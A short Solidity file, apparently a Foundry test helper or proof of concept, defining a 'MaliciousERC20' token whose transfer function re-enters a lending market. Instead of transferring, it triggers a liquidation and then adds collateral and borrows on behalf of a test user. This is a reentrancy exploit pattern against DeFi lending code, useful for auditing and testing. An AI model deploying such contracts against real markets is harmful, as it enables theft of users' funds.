// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {IMarket} from "@alto/lending/interfaces/IMarket.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousERC20 {
    address public attacker;
    address public market;
    address public alice = address(0x00000000000000000000000000000000000A11cE);

    constructor(address _attacker, address _market) {
        attacker = _attacker;
        market = _market;
    }

    function transfer(address to, uint256 amount) external {
        IERC20(IMarket(market).borrowToken()).approve(address(market), type(uint256).max);
        IMarket(market).liquidate(attacker, hex"");
        IERC20(IMarket(market).collateralToken()).approve(address(market), type(uint256).max);
        IMarket(market).addCollateral(200 wei, alice);
        IMarket(market).borrow(100 wei, 0, alice, alice, hex"");
    }
}
